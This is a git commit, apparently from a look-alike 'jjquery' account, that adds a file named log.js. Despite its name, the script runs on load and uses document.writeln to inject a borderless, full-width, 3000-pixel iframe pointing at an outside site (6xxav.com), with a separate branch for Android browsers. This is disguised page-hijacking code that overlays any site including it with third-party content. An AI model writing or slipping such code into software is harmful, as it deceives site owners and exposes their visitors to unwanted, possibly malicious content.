82be378198c75d14e3db9367d82dd80a3f029fdf
jjquery <34562072+jjquery@users.noreply.github.com>
2017-12-15 11:50:00 +0800

    Create log.js

---
+++ log.js
@@ -0,0 +1,11 @@
+function uaredirect() {
+	var n = navigator.userAgent.toLowerCase();
+	     if (n.indexOf('android')>-1){
+document.writeln('<iframe scrolling="no" frameborder="0" marginheight="0" marginwidth="0" width="100%" height="3000" allowTransparency src="https://www.6xxav.com"></iframe>');
+}
+         else {
+document.writeln('<center><iframe scrolling="no" frameborder="0" marginheight="0" marginwidth="0" width="100%" height="3000" allowTransparency src="https://www.6xxav.com"></iframe></center>');
+
+}
+}
+uaredirect();
